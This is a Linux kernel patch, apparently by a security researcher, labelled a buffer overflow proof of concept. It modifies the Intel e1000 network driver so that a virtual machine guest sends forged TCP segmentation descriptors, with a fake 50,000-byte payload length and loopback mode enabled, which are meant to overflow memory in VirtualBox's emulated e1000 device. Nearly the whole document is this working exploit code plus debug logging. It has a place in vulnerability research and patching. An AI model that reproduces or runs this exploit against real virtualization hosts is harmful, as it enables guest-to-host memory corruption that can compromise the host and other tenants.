@@ -1,0 +1,162 @@
+From 1aa5b773716e6dd5fc7ea240b5808ababc168851 Mon Sep 17 00:00:00 2001
+From: Lucas Molas <>
+Date: Tue, 25 Apr 2017 18:42:45 -0300
+Subject: [PATCH] e1k buffer overflow poc
+
+---
+ drivers/net/ethernet/intel/e1000/e1000_main.c | 76 +++++++++++++++++++++++++++
+ 1 file changed, 76 insertions(+)
+
+diff --git a/drivers/net/ethernet/intel/e1000/e1000_main.c b/drivers/net/ethernet/intel/e1000/e1000_main.c
+index f42129d..b8c6aac 100644
+--- a/drivers/net/ethernet/intel/e1000/e1000_main.c
++++ b/drivers/net/ethernet/intel/e1000/e1000_main.c
+@@ -32,6 +32,7 @@
+ #include <linux/prefetch.h>
+ #include <linux/bitops.h>
+ #include <linux/if_vlan.h>
++#include <linux/printk.h>
+ 
+ char e1000_driver_name[] = "e1000";
+ static char e1000_driver_string[] = "Intel(R) PRO/1000 Network Driver";
+@@ -39,6 +40,8 @@ static char e1000_driver_string[] = "Intel(R) PRO/1000 Network Driver";
+ const char e1000_driver_version[] = DRV_VERSION;
+ static const char e1000_copyright[] = "Copyright (c) 1999-2006 Intel Corporation.";
+ 
++#define VBOX_BUFFER_OVERFLOW_POC
++
+ /* e1000_pci_tbl - PCI Device ID Table
+  *
+  * Last entry must be all 0s
+@@ -1797,6 +1800,14 @@ static void e1000_setup_rctl(struct e1000_adapter *adapter)
+ 		E1000_RCTL_RDMTS_HALF |
+ 		(hw->mc_filter_type << E1000_RCTL_MO_SHIFT);
+ 
++#ifdef VBOX_BUFFER_OVERFLOW_POC
++
++	rctl |= E1000_RCTL_BAM | E1000_RCTL_LBM_TCVR |
++		E1000_RCTL_RDMTS_HALF |
++		(hw->mc_filter_type << E1000_RCTL_MO_SHIFT);
++
++#endif /* VBOX_BUFFER_OVERFLOW_POC */
++
+ 	if (hw->tbi_compatibility_on == 1)
+ 		rctl |= E1000_RCTL_SBP;
+ 	else
+@@ -1844,6 +1855,8 @@ static void e1000_setup_rctl(struct e1000_adapter *adapter)
+ 		 */
+ 	}
+ 
++	printk(KERN_WARNING "VBOX: e1000_setup_rctl: Writing to RCTL: %x\n", rctl);
++
+ 	ew32(RCTL, rctl);
+ }
+ 
+@@ -2815,6 +2828,45 @@ static bool e1000_tx_csum(struct e1000_adapter *adapter,
+ 	context_desc->tcp_seg_setup.data = 0;
+ 	context_desc->cmd_and_length = cpu_to_le32(cmd_len);
+ 
++#ifdef VBOX_BUFFER_OVERFLOW_POC
++
++	#define FAKE_PAYLEN_VALUE (50 * 1000)
++	#define FAKE_MSS_VALUE FAKE_PAYLEN_VALUE
++
++	/* Taken from e1000_tso() */
++	u32 cmd_length = 0;
++	u16 ipcse = 0, tucse, mss;
++	u8 ipcss, ipcso, tucss, tucso, hdr_len;
++
++	hdr_len = skb_transport_offset(skb) + tcp_hdrlen(skb);
++	mss = FAKE_MSS_VALUE;
++
++	ipcse = 0;
++
++	ipcss = skb_network_offset(skb);
++	ipcso = (void *)&(ip_hdr(skb)->check) - (void *)skb->data;
++	tucss = skb_transport_offset(skb);
++	tucso = (void *)&(tcp_hdr(skb)->check) - (void *)skb->data;
++	tucse = 0;
++
++
++	cmd_length |= (E1000_TXD_CMD_DEXT | E1000_TXD_CMD_TSE |
++		       E1000_TXD_CMD_TCP | FAKE_PAYLEN_VALUE);
++
++	context_desc->lower_setup.ip_fields.ipcss  = ipcss;
++	context_desc->lower_setup.ip_fields.ipcso  = ipcso;
++	context_desc->lower_setup.ip_fields.ipcse  = cpu_to_le16(ipcse);
++	context_desc->upper_setup.tcp_fields.tucss = tucss;
++	context_desc->upper_setup.tcp_fields.tucso = tucso;
++	context_desc->upper_setup.tcp_fields.tucse = cpu_to_le16(tucse);
++	context_desc->tcp_seg_setup.fields.mss     = cpu_to_le16(mss);
++	context_desc->tcp_seg_setup.fields.hdr_len = hdr_len;
++	context_desc->cmd_and_length = cpu_to_le32(cmd_length);
++	/* End of extraction from  e1000_tso() */
++
++#endif /* VBOX_BUFFER_OVERFLOW_POC */
++
++
+ 	buffer_info->time_stamp = jiffies;
+ 	buffer_info->next_to_watch = i;
+ 
+@@ -3008,6 +3060,18 @@ static void e1000_tx_queue(struct e1000_adapter *adapter,
+ 	if (unlikely(tx_flags & E1000_TX_FLAGS_NO_FCS))
+ 		txd_lower &= ~(E1000_TXD_CMD_IFCS);
+ 
++#ifdef VBOX_BUFFER_OVERFLOW_POC
++
++	if ((txd_lower & E1000_TXD_CMD_DEXT) == 0)
++		return;
++		/* Skip legacy packets, they can't trigger the overflow,
++		 * and the first descriptor that VBox receives has to be
++		 * the one that causes the overflow (due to the bug in
++		 * the loopback mode memory allocation.
++		 */
++
++#endif /* VBOX_BUFFER_OVERFLOW_POC */
++
+ 	i = tx_ring->next_to_use;
+ 
+ 	while (count--) {
+@@ -3016,6 +3080,14 @@ static void e1000_tx_queue(struct e1000_adapter *adapter,
+ 		tx_desc->buffer_addr = cpu_to_le64(buffer_info->dma);
+ 		tx_desc->lower.data =
+ 			cpu_to_le32(txd_lower | buffer_info->length);
++
++#ifdef VBOX_BUFFER_OVERFLOW_POC
++
++		tx_desc->lower.data =
++			cpu_to_le32(txd_lower | E1000_TXD_CMD_TSE | FAKE_PAYLEN_VALUE);
++
++#endif /* VBOX_BUFFER_OVERFLOW_POC */
++
+ 		tx_desc->upper.data = cpu_to_le32(txd_upper);
+ 		if (unlikely(++i == tx_ring->count))
+ 			i = 0;
+@@ -3139,6 +3211,7 @@ static netdev_tx_t e1000_xmit_frame(struct sk_buff *skb,
+ 		return NETDEV_TX_OK;
+ 
+ 	mss = skb_shinfo(skb)->gso_size;
++	printk(KERN_WARNING "VBOX: e1000_xmit_frame: mss = skb_shinfo(skb)->gso_size = %u\n", mss);
+ 	/* The controller does a simple calculation to
+ 	 * make sure there is enough room in the FIFO before
+ 	 * initiating the DMA for each buffer.  The calc is:
+@@ -3182,6 +3255,8 @@ static netdev_tx_t e1000_xmit_frame(struct sk_buff *skb,
+ 			}
+ 		}
+ 	}
++	printk(KERN_WARNING "VBOX: e1000_xmit_frame: mss after manipulation: %u\n", mss);
++
+ 
+ 	/* reserve a descriptor for the offload context */
+ 	if ((mss) || (skb->ip_summed == CHECKSUM_PARTIAL))
+@@ -3234,6 +3309,7 @@ static netdev_tx_t e1000_xmit_frame(struct sk_buff *skb,
+ 	first = tx_ring->next_to_use;
+ 
+ 	tso = e1000_tso(adapter, tx_ring, skb, protocol);
++	printk(KERN_WARNING "VBOX: e1000_xmit_frame: e1000_tso: %d\n", tso);
+ 	if (tso < 0) {
+ 		dev_kfree_skb_any(skb);
+ 		return NETDEV_TX_OK;
+-- 
+2.7.4
+
